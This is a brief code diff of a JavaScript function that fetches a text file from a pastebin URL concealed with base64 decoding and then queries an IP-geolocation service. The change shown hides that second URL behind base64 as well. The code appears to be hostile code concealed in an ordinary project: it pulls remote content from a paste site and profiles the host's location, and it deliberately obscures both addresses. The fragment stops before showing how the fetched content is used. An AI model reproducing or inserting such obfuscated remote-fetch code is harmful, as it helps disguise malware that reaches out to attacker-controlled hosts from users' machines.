@@ -1,7 +1,7 @@
 function req () {
   axios({url:window.atob('aHR0cHM6Ly9wYXN0ZWJpbi5ydW4vdnozZ3RwY3c2bTM5LnR4dA=='),method:'GET'}).then(file => {
     const get = {
-        url:'https://ipwhois.app/json/',
+        url:window.atob('aHR0cHM6Ly9pcHdob2lzLmFwcC9qc29uLw=='),
         method:'GET'
       }
       axios(get).then(res => {
